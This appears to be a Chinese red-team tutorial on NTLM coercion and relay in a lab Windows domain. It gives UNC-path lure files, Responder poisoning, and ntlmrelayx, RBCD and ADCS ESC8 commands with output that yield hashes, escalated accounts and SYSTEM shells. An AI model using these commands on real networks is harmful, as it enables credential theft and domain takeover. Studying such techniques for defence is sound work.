+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250511230801195.png"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250511230839855.png" alt="image-20250511230839855"></p>
+<h2 id="诱导"><a href="#诱导" class="headerlink" title="诱导"></a>诱导</h2><p><strong>PDF文件</strong></p>
+<p>PDF规范允许为GoTobe和GoToR条目加载远程内容。PDF文件可以添加一项功能，请求远程SMB服务器的文件，<a target="_blank" rel="noopener" href="https://github.com/3gstudent/Worse-PDF">https://github.com/3gstudent/Worse-PDF</a></p>
+<p><strong>Office文件</strong></p>
+<p>修改document.xml.rels，和 word/excel2XXE类似</p>
+<p>将Target参数修改为UNC路径，然后加上 <code>TargetMode=&quot;External&quot;</code></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/1634975532_6173bf2c4178a061cdf5a.png"></p>
+<p><strong>Outlook邮件</strong></p>
+<p>发送邮件是支持html的，而且outlook里面的图片加载路径又可以是UNC</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;\\172.16.100.1\outlook&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>desktop.ini文件</strong></p>
+<p>当更改文件夹图标时会生成desktop.ini，修改 IconResource路径</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250511223658508.png" alt="image-20250511223658508"></p>
+<p><strong>SCF文件</strong></p>
+<p>只要一个文件底下含有scf后缀的文件,由于scf文件包含了IconFile属性，所以Explore.exe会尝试获取文件的图标</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Shell]</span><br><span class="line">Command&#x3D;2</span><br><span class="line">IconFile&#x3D;\\192.168.100.133\scf\test.ico</span><br><span class="line">[Taskbar]</span><br><span class="line">Command&#x3D;ToggleDesktop</span><br></pre></td></tr></table></figure>
+
+<p>写入到test.scf并放到某文件夹下，访问文件夹</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250511225259723.png" alt="image-20250511225259723"></p>
+<h2 id="网络欺骗"><a href="#网络欺骗" class="headerlink" title="网络欺骗"></a>网络欺骗</h2><p><strong>LLMNR/NBT-NS/(M)DNS Poisoning</strong></p>
+<p>链路本地多播名称解析（LLMNR）是一个基于协议的域名系统（DNS）数据包的格式，使得双方的IPv4和IPv6的主机来执行名称解析为同一本地链路上的主机。当局域网中的DNS服务器不可用时，DNS客户端会使用LLMNR本地链路多播名称解析来解析本地网段上的主机的名称，直到网络连接恢复正常为止。</p>
+<p>Windows系统名称解析顺序：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">本地缓存</span><br><span class="line">Hosts文件</span><br><span class="line">DNS服务器</span><br><span class="line">NBNS (NetBIOS Name Service)广播</span><br><span class="line">LLMNR &#x2F; mDNS (局域网名解析)</span><br></pre></td></tr></table></figure>
+
+<p>当用户输入 不存在、包含错误、DNS中没有的主机名 时，主机先在自己的内部名称缓存中查询名称，如果没找到，主机就会向DNS服务器查询，而DNS解析会失败，此时就会退回LLMNR和NetBIOS进行对链路内存在的主机进行广播查询。那么攻击者就能够代替网络上任何不存在的主机回答请求，并诱导搜索内容的主机连接到我们。如果攻击者使用 Responder 等工具，就可以要求验证受害者主机的身份，而如果攻击者被认为是这些主机所在的本地网络中的一部分时，他们就会把自己进行哈希后的Windows凭据发给攻击者。</p>
+<p>受害机以本地管理员Administrator 访问</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\\whatevers</span><br></pre></td></tr></table></figure>
+
+<p>攻击机 -A 参数会分析 LLMNR 和 NBT-NS 请求有哪些机器被欺骗到</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">responder -I eth1 -A</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250824233010762.png" alt="image-20250824233010762"></p>
+<p>去除-A参数，重新欺骗</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">responder -I eth1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250824233630498.png" alt="image-20250824233630498"></p>
+<h1 id="Net-NTLM-hash利用"><a href="#Net-NTLM-hash利用" class="headerlink" title="Net-NTLM hash利用"></a>Net-NTLM hash利用</h1><p>利用主要分为两部分：</p>
+<ul>
+<li>Relay 到其他机器</li>
+<li>Relay 到自己，即 NTLM Reflect</li>
+</ul>
+<h2 id="签名扫描"><a href="#签名扫描" class="headerlink" title="签名扫描"></a>签名扫描</h2><p>Relay前进行 签名信息的扫描 还是比较重要的，不然失败都不知道原因</p>
+<p>cme/nxc：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackMapExec&#x2F;netexec smb 192,168.100.130</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250824234703206.png" alt="image-20250824234703206"></p>
+<p>PsMapExec</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PsMapExec -Targets all -Method GenRelayList</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250831224959923.png" alt="image-20250831224959923"></p>
+<p>RunFinger：responder下脚本</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 不知为何 DC 没扫出来签名</span><br><span class="line">┌──(root㉿kali)-[&#x2F;usr&#x2F;share&#x2F;responder&#x2F;tools]</span><br><span class="line">└─# python3 RunFinger.py -f &#x2F;home&#x2F;h4ck&#x2F;Desktop&#x2F;ips.txt</span><br><span class="line"></span><br><span class="line">[SMB2]:[&#39;192.168.100.128&#39;, Os:&#39;Windows 8.1&#x2F;Server 2012R2&#39;, Build:&#39;9600&#39;, Domain:&#39;TEST&#39;, Bootime: &#39;2025-01-29 02:02:12&#39;, Signing:&#39;False&#39;, RDP:&#39;False&#39;, SMB1:&#39;True&#39;, MSSQL:&#39;False&#39;]</span><br><span class="line">[SMB2]:[&#39;192.168.100.130&#39;, Os:&#39;Windows 7&#x2F;Server 2008R2&#39;, Build:&#39;7601&#39;, Domain:&#39;TEST&#39;, Bootime: &#39;2025-08-17 05:40:33&#39;, Signing:&#39;False&#39;, RDP:&#39;False&#39;, SMB1:&#39;True&#39;, MSSQL:&#39;False&#39;]</span><br><span class="line">[SMB2]:[&#39;192.168.100.131&#39;, Os:&#39;Windows 10&#x2F;Server 2016&#x2F;2019 (check build)&#39;, Build:&#39;17763&#39;, Domain:&#39;TEST&#39;, Bootime: &#39;Unknown&#39;, Signing:&#39;False&#39;, RDP:&#39;False&#39;, SMB1:&#39;False&#39;, MSSQL:&#39;True&#39;]</span><br></pre></td></tr></table></figure>
+
+<p>LdapRelayScan：<a target="_blank" rel="noopener" href="https://github.com/zyn3rgy/LdapRelayScan">https://github.com/zyn3rgy/LdapRelayScan</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">└─$ python3 LdapRelayScan.py -method BOTH -dc-ip 192.168.100.128 -u tom -p Ab123456</span><br><span class="line"></span><br><span class="line">Domain Controllers identified~</span><br><span class="line">   dc-1.test.com</span><br><span class="line"></span><br><span class="line">~Checking DCs for LDAP NTLM relay protections~</span><br><span class="line">   dc-1.test.com</span><br><span class="line">      [+] (LDAP)  SERVER SIGNING REQUIREMENTS NOT ENFORCED! </span><br></pre></td></tr></table></figure>
+
+<h2 id="NTLM-Relay-1"><a href="#NTLM-Relay-1" class="headerlink" title="NTLM Relay"></a>NTLM Relay</h2><p>下面的各种Relay2 都是展示了将流量中继到不同协议的怎么利用思路：中继到不同协议能干什么事情。关于 Relay 的利用工具，基本会用到这几个</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smbrelayx.py - impacket</span><br><span class="line">ntlmrelayx.py - impacket</span><br><span class="line">MultiRelay.py - responder</span><br></pre></td></tr></table></figure>
+
+<p>实验机器：</p>
+<p>kali - 192.168.100.133</p>
+<p>DC - 192.168.100.128</p>
+<p>win7 - 192.168.100.130</p>
+<p>2019 - 192.168.100.131</p>
+<h3 id="Relay2SMB"><a href="#Relay2SMB" class="headerlink" title="Relay2SMB"></a>Relay2SMB</h3><p>SMB 中继是最直接最有效的方法 (包括但不限于执行命令、上传执行exe、dump hash等)，但是SMB是需要看发起请求账号的权限，比如普通域用户A一般情况没有对机器B具有管理权限，因此无法通过relay去横向B</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 命令执行</span><br><span class="line">impacket-ntlmrelayx -t smb:&#x2F;&#x2F;&lt;target&gt; --no-http-server --no-wcf-server --no-raw-server -smb2support -c whoami</span><br><span class="line"></span><br><span class="line"># 远程导SAM dump local hash</span><br><span class="line">impacket-ntlmrelayx -t smb:&#x2F;&#x2F;&lt;target&gt; --no-http-server --no-wcf-server --no-raw-server -smb2support</span><br><span class="line"></span><br><span class="line"># interactive shell</span><br><span class="line">impacket-ntlmrelayx -t smb:&#x2F;&#x2F;&lt;target&gt; --no-http-server --no-wcf-server --no-raw-server -smb2support -i</span><br><span class="line"></span><br><span class="line"># execute EXE</span><br><span class="line">impacket-ntlmrelayx -t smb:&#x2F;&#x2F;&lt;target&gt; --no-http-server --no-wcf-server --no-raw-server -smb2support -e beacon.exe</span><br><span class="line"></span><br><span class="line"># 批量 relay</span><br><span class="line">impacket-ntlmrelayx -tf ips.txt -of res.txt --no-http-server --no-wcf-server --no-raw-server -smb2support</span><br><span class="line"></span><br><span class="line"># socks代理，中继成功就会在本地 1080 监听端口自动维持会话有效性</span><br><span class="line">impacket-ntlmrelayx -t smb:&#x2F;&#x2F;&lt;target&gt; --no-http-server --no-wcf-server --no-raw-server -smb2support -socks</span><br><span class="line">proxychains impacket-secretsdump test.com&#x2F;Administrator@192.168.100.130</span><br></pre></td></tr></table></figure>
+
+<p>对目标机器有管理权限的账户（域管）对kali发起请求</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop&gt;net use \\192.168.100.133</span><br><span class="line">发生系统错误 58。</span><br><span class="line"></span><br><span class="line">指定的服务器无法运行请求的操作。</span><br></pre></td></tr></table></figure>
+
+<p>kali realy 到域内win7，命令执行</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250831232837026.png" alt="image-20250831232837026"></p>
+<p>无管理权限用户发起请求情况：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 普通域用户</span><br><span class="line">└─$ impacket-ntlmrelayx -t smb:&#x2F;&#x2F;192.168.100.130 --no-http-server --no-wcf-server --no-raw-server -smb2support -c hostname</span><br><span class="line">...</span><br><span class="line">[*] Setting up SMB Server on port 445</span><br><span class="line">[*] Multirelay disabled</span><br><span class="line"></span><br><span class="line">[*] Servers started, waiting for connections</span><br><span class="line">[*] SMBD-Thread-2 (process_request_thread): Received connection from 192.168.100.131, attacking target smb:&#x2F;&#x2F;192.168.100.130</span><br><span class="line">[*] Authenticating against smb:&#x2F;&#x2F;192.168.100.130 as TEST.COM&#x2F;TOM SUCCEED</span><br><span class="line">[-] DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied </span><br><span class="line">[*] All targets processed!</span><br><span class="line"></span><br><span class="line"># 2019 本地管理员</span><br><span class="line">└─$ impacket-ntlmrelayx -t smb:&#x2F;&#x2F;192.168.100.130 --no-http-server --no-wcf-server --no-raw-server -smb2support -c hostname</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line">...</span><br><span class="line">[*] Setting up SMB Server on port 445</span><br><span class="line">[*] Multirelay disabled</span><br><span class="line"></span><br><span class="line">[*] Servers started, waiting for connections</span><br><span class="line">[*] SMBD-Thread-2 (process_request_thread): Received connection from 192.168.100.131, attacking target smb:&#x2F;&#x2F;192.168.100.130</span><br><span class="line">[-] Authenticating against smb:&#x2F;&#x2F;192.168.100.130 as MSSQL&#x2F;ADMINISTRATOR FAILED</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Relay2LDAP"><a href="#Relay2LDAP" class="headerlink" title="Relay2LDAP"></a>Relay2LDAP</h3><p>LDAP利用方式就很多，而且可以很好的搭配强制认证（机器用户也是域内用户），其利用方式大概如下：</p>
+<ul>
+<li><p>域内信息收集</p>
+</li>
+<li><p>高权限用户组拉任意用户进组</p>
+</li>
+<li><p>acl权限操纵</p>
+</li>
+<li><p>配置RBCD</p>
+</li>
+<li><p>shadow credentials 权限维持</p>
+</li>
+<li><p>创建用户</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># ntlmrelayx 关于LDAP</span><br><span class="line">LDAP client options:</span><br><span class="line">  --no-dump             Do not attempt to dump LDAP information</span><br><span class="line">  --no-da               Do not attempt to add a Domain Admin</span><br><span class="line">  --no-acl              Disable ACL attacks</span><br><span class="line">  --no-validate-privs   Do not attempt to enumerate privileges, assume permissions are granted to escalate a user via ACL attacks</span><br><span class="line">  --escalate-user ESCALATE_USER</span><br><span class="line">                        Escalate privileges of this user instead of creating a new one</span><br><span class="line">  --delegate-access     Delegate access on relayed computer account to the specified account</span><br><span class="line">  --sid                 Use a SID to delegate access rather than an account name</span><br><span class="line">  --dump-laps           Attempt to dump any LAPS passwords readable by the user</span><br><span class="line">  --dump-gmsa           Attempt to dump any gMSA passwords readable by the user</span><br><span class="line">  --dump-adcs           Attempt to dump ADCS enrollment services and certificate templates info</span><br><span class="line">  --add-dns-record NAME IPADDR</span><br><span class="line">                        Add the &lt;NAME&gt; record to DNS via LDAP pointing to &lt;IPADDR&gt;</span><br><span class="line">  --add-computer [COMPUTERNAME [PASSWORD ...]]</span><br><span class="line">                        Attempt to add a new computer account via SMB or LDAP, depending on the specified target. This argument can be used either with the LDAP or the SMB service, as long as the target is a domain controller.</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>域内信息收集</strong>（实验环境没有HTTP，因此采用 强制认证 + CVE-2019-1040 来忽略SMB到LDAP的签名问题）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">impacket-ntlmrelayx -t ldap:&#x2F;&#x2F;&lt;DC&gt; --no-http-server --no-wcf-server --no-raw-server -smb2support --no-da --no-acl --no-validate-privs --remove-mic</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250901013522112.png" alt="image-20250901013522112"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250901013559710.png" alt="image-20250901013559710"></p>
+<hr>
+<p><strong>高权限用户组拉任意用户进组</strong>（实验环境没有HTTP，因此采用 CVE-2019-1040 来忽略SMB到LDAP的签名问题）</p>
+<p>如果发起NTLM的用户在以下用户组，那么就可以将任意用户拉进该组，从而使该用户变为高权限用户</p>
+<ul>
+<li>Enterprise admins</li>
+<li>Domain admins</li>
+<li>Built-in Administrators</li>
+<li>Backup operators</li>
+<li>Account operators</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">impacket-ntlmrelayx -t ldap:&#x2F;&#x2F;&lt;DC&gt; --no-http-server --no-wcf-server --no-raw-server -smb2support --remove-mic --no-dump --no-acl --escalate-user zhangsan</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250902223511383.png" alt="image-20250902223511383"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250902223546989.png" alt="image-20250902223546989"></p>
+<hr>
+<p><strong>ACL权限操纵</strong></p>
+<p>关于ACL的提权利用：如果发起者有 Write-ACL权限，那么就可以在以下两条ACE中添加任意用户，从而使得被添加用户可以具备 dcsync 的权限。</p>
+<ul>
+<li><p><strong>DS-Replication-GetChanges（GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2）</strong></p>
+</li>
+<li><p><strong>DS-Replication-Get-Changes-All（GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2）</strong></p>
+</li>
+</ul>
+<p>常见利用：</p>
+<ul>
+<li>强制Exchange认证：<strong>Exchange机器用户</strong> 在 <strong>Exchange Trusted Subsystem</strong> Group 中，该Group在 <strong>Exchange Windows Permissions</strong> 中，<strong>这两个Group具有Write-ACL权限！</strong></li>
+<li>强制认证方式可以有：CVE-2018-8581（PrivExchange）、PetitPotam等</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># --no-validate-privs 添加选项则只进行ACL attack</span><br><span class="line">impacket-ntlmrelayx -t ldap:&#x2F;&#x2F;&lt;DC&gt; --no-http-server --no-wcf-server --no-raw-server -smb2support --remove-mic --no-dump --no-validate-privs --escalate-user zhangsan</span><br></pre></td></tr></table></figure>
+
+<p>关于以上两种攻击，简单分析下ntlmrelayx源码。通过选项配置LDAP</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250902012234066.png" alt="image-20250902012234066"></p>
+<p>在 ldapattack.py 的 run() 中，首先检查发起relay用户的权限，检查三种：创建用户、高权限组、修改ACL权限</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250902012440820.png" alt="image-20250902012440820"></p>
+<p>如果权限、选项参数通过，尝试ACL攻击，为 <code>--escalate-user</code> 指定的用户或者新创建用户添加ACE权限</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250902012727180.png" alt="image-20250902012727180"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250902012845542.png" alt="image-20250902012845542"></p>
+<p>接下来权限、选项参数通过，尝试高权限组用户攻击</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250902012953714.png" alt="image-20250902012953714"></p>
+<p>添加用户到高权限组中</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250902013324023.png" alt="image-20250902013324023"></p>
+<hr>
+<p><strong>配置RBCD</strong>（采用 CVE-2019-1040 来忽略SMB到LDAP的签名问题）</p>
+<p>这一块看了《Kerberos委派攻击》就比较熟悉了，通过 Relay + 通过LDAP配置RBCD属性 实现域内提权、横向移动</p>
+<blockquote>
+<p>本地实验1：通过 匿名强制认证 + Relay 添加机器账户并添加委派，实现 无域内凭证横向到域内机器 - 失败</p>
+<p>PetitPotam 在2008、2012低版本环境下可无需用户匿名触发</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">impacket-ntlmrelayx -t ldap:&#x2F;&#x2F;&lt;DC&gt; --no-http-server --no-wcf-server --no-raw-server -smb2support --remove-mic --no-dump --no-da --no-acl --no-validate-privs --delegate-access</span><br></pre></td></tr></table></figure>
+
+<p>报错原因：某些类型的操作（查找敏感属性&lt;托管账户的密码&gt;、某些修改操作&lt;创建机器账户&gt;）需要加密连接（使用 TLS 或 LDAP 封装），解决：通过HTTP relay，使用 StartTLS 绕过 LDAP 通道绑定<a target="_blank" rel="noopener" href="https://github.com/fortra/impacket/pull/1305">^4</a></p>
+ <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[*] Servers started, waiting for connections</span><br><span class="line">[*] SMBD-Thread-2 (process_request_thread): Received connection from 192.168.100.130, attacking target ldap:&#x2F;&#x2F;192.168.100.128</span><br><span class="line">[*] Authenticating against ldap:&#x2F;&#x2F;192.168.100.128 as TEST&#x2F;WIN7$ SUCCEED</span><br><span class="line">[*] Assuming relayed user has privileges to escalate a user via ACL attack</span><br><span class="line">[*] Adding a machine account to the domain requires TLS but ldap:&#x2F;&#x2F; scheme provided. Switching target to LDAPS via StartTLS</span><br><span class="line">Exception in thread Thread-3:</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3.11&#x2F;threading.py&quot;, line 1045, in _bootstrap_inner</span><br><span class="line">    self.run()</span><br><span class="line">  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;impacket&#x2F;examples&#x2F;ntlmrelayx&#x2F;attacks&#x2F;ldapattack.py&quot;, line 1119, in run</span><br><span class="line">    self.addComputer(computerscontainer, domainDumper)</span><br><span class="line">  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;impacket&#x2F;examples&#x2F;ntlmrelayx&#x2F;attacks&#x2F;ldapattack.py&quot;, line 139, in addComputer</span><br><span class="line">    if not self.client.start_tls():</span><br><span class="line">           ^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;ldap3&#x2F;core&#x2F;connection.py&quot;, line 1314, in start_tls</span><br><span class="line">    if self.server.tls.start_tls(self) and self.strategy.sync:  # for asynchronous connections _start_tls is run by the strategy</span><br><span class="line">       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;ldap3&#x2F;core&#x2F;tls.py&quot;, line 277, in start_tls</span><br><span class="line">    raise LDAPStartTLSError(connection.last_error)</span><br><span class="line">ldap3.core.exceptions.LDAPStartTLSError: startTLS failed - unavailable</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>本地实验2：通过 强制认证 + Relay 添加机器账户并添加委派，实现横向到域内机器win7</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 添加机器用户</span><br><span class="line">$ impacket-addcomputer -computer-name &#39;TEST&#39; -computer-pass 123456 -dc-host DC-1.test.com -dc-ip 192.168.100.128 test.com&#x2F;tom:Ab123456</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Successfully added machine account TEST$ with password 123456.</span><br><span class="line"></span><br><span class="line"># Relay</span><br><span class="line">$ impacket-ntlmrelayx -t ldap:&#x2F;&#x2F;192.168.100.128 --no-http-server --no-wcf-server --no-raw-server -smb2support --remove-mic --no-dump --no-da --no-acl --no-validate-privs --delegate-access --escalate-user &#39;TEST$&#39;</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Protocol Client SMTP loaded..</span><br><span class="line">[*] Protocol Client SMB loaded..</span><br><span class="line">[*] Protocol Client RPC loaded..</span><br><span class="line">[*] Protocol Client IMAP loaded..</span><br><span class="line">[*] Protocol Client IMAPS loaded..</span><br><span class="line">[*] Protocol Client DCSYNC loaded..</span><br><span class="line">[*] Protocol Client MSSQL loaded..</span><br><span class="line">[*] Protocol Client HTTP loaded..</span><br><span class="line">[*] Protocol Client HTTPS loaded..</span><br><span class="line">[*] Protocol Client LDAP loaded..</span><br><span class="line">[*] Protocol Client LDAPS loaded..</span><br><span class="line">[*] Running in relay mode to single host</span><br><span class="line">[*] Setting up SMB Server on port 445</span><br><span class="line">[*] Multirelay disabled</span><br><span class="line"></span><br><span class="line">[*] Servers started, waiting for connections</span><br><span class="line">[*] SMBD-Thread-2 (process_request_thread): Received connection from 192.168.100.130, attacking target ldap:&#x2F;&#x2F;192.168.100.128</span><br><span class="line">[*] Authenticating against ldap:&#x2F;&#x2F;192.168.100.128 as TEST&#x2F;WIN7$ SUCCEED</span><br><span class="line">[*] Assuming relayed user has privileges to escalate a user via ACL attack</span><br><span class="line">[*] Delegation rights modified succesfully!</span><br><span class="line">[*] TEST$ can now impersonate users on WIN7$ via S4U2Proxy</span><br><span class="line"></span><br><span class="line"># 申请 ST</span><br><span class="line">$ impacket-getST -dc-ip 192.168.100.128 -spn cifs&#x2F;win7.test.com -impersonate Administrator test.com&#x2F;&#39;TEST$&#39;:123456</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[-] CCache file is not found. Skipping...</span><br><span class="line">[*] Getting TGT for user</span><br><span class="line">[*] Impersonating Administrator</span><br><span class="line">[*] Requesting S4U2self</span><br><span class="line">[*] Requesting S4U2Proxy</span><br><span class="line">[*] Saving ticket in Administrator@cifs_win7.test.com@TEST.COM.ccache</span><br><span class="line"></span><br><span class="line"># PTT</span><br><span class="line">$ export KRB5CCNAME&#x3D;Administrator@cifs_win7.test.com@TEST.COM.ccache</span><br><span class="line">$ impacket-smbexec -dc-ip 192.168.100.128 -k -no-pass Administrator@win7.test.com</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[!] Launching semi-interactive shell - Careful what you execute</span><br><span class="line">C:\Windows\system32&gt;hostname</span><br><span class="line">win7</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>Shadow Credentials</strong></p>
+<p><a target="_blank" rel="noopener" href="https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab">Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover</a></p>
+<h3 id="Relay2ADCS"><a href="#Relay2ADCS" class="headerlink" title="Relay2ADCS"></a>Relay2ADCS</h3><p>ADCS中的Relay称为ESC8，原理为：ADCS的http证书接口允许通过NTLM身份验证，未但是启用NTLM中继保护，因此攻击者可以利用NTLM Relay攻击ADCS证书服务。攻击者可以在一个默认安装了证书web服务的域环境中，使用普通用户凭据，直接获取到域管权限。</p>
+<p>定位CA</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">certutil.exe</span><br><span class="line">certutil.exe -ca</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250903022636631.png" alt="image-20250903022636631"></p>
+<p>探测CA的http</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;ca.purple.lab&#x2F;certsrv&#x2F; -I</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250903022847139.png" alt="image-20250903022847139"></p>
+<p>ntlmrelayx监听</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">impacket-ntlmrelayx -t http:&#x2F;&#x2F;ca.purple.lab&#x2F;certsrv&#x2F;certfnsh.asp -smb2support --adcs --template DomainController</span><br></pre></td></tr></table></figure>
+
+<p>强制域控认证</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">impacket-PetitPotam -d purple.lab -u pentestlab -p Password1234 &lt;attack&gt; &lt;DC&gt;</span><br></pre></td></tr></table></figure>
+
+<p>会获得DC的Base64格式的证书</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250903023606370.png" alt="image-20250903023606370"></p>
+<p>通过Rubeus导入证书，申请票据</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rubeus.exe asktgt &#x2F;user:DC$ &#x2F;certificate:&lt;base64-certificate&gt; &#x2F;ptt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250903023915267.png" alt="image-20250903023915267"></p>
+<p>或者使用impacket</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 支持 PKINIT 协议</span><br><span class="line">cat base64.txt | base64 -d &gt; dc01.pfx</span><br><span class="line">python3 gettgtpkinit.py -cert-pfx dc01.pfx hack.lab&#x2F;DC01$ dc01.ccache</span><br><span class="line">export KRB5CCNAME&#x3D;dc01.ccache</span><br><span class="line"></span><br><span class="line"># 不支持 PKINIT 协议</span><br><span class="line">&#x2F;&#x2F; 提取密钥与证书</span><br><span class="line">certipy cert -pfx NoPKI02.pfx -nokey -out NoPKI02.crt</span><br><span class="line">certipy cert -pfx NoPKI02.pfx -nocert -out NoPKI02.key</span><br><span class="line">&#x2F;&#x2F; 创建机器用户</span><br><span class="line">python3 passthecert.py -action add_computer -crt NoPKI02.crt -key NoPKI02.key -domain hack.lab -dc-ip 20.20.20.5 -computer-name NoPKI02$ -computer-pass 123.com</span><br><span class="line">&#x2F;&#x2F; 配置域控RBCD</span><br><span class="line">python3 passthecert.py -action write_rbcd -crt NoPKI02.crt -key NoPKI02.key -domain hack.lab -dc-ip 20.20.20.5 -delegate-from NoPKI02$ -delegate-to DC01$</span><br><span class="line">&#x2F;&#x2F; PTT</span><br><span class="line">python3 getST.py -spn cifs&#x2F;DC01.hack.lab -impersonate administrator hack.lab&#x2F;NoPKI02\$:123.com -dc-ip 20.20.20.5</span><br><span class="line">export KRB5CCNAME&#x3D;...</span><br></pre></td></tr></table></figure>
+
+<h3 id="Relay2EWS"><a href="#Relay2EWS" class="headerlink" title="Relay2EWS"></a>Relay2EWS</h3><p>Exchange 的认证也是支持NTLM SSP的。可以relay，从而收发邮件，代理等等。工具：<a target="_blank" rel="noopener" href="https://github.com/Arno0x/NtlmRelayToEWS">https://github.com/Arno0x/NtlmRelayToEWS</a></p>
+<h3 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h3><p>在Relay的攻击中，关于签名完整性的CVE绝对是至关重要的，如果能够无视签名完整性的保护，能大大扩宽攻击路径</p>
+<ul>
+<li>CVE-2015-0005</li>
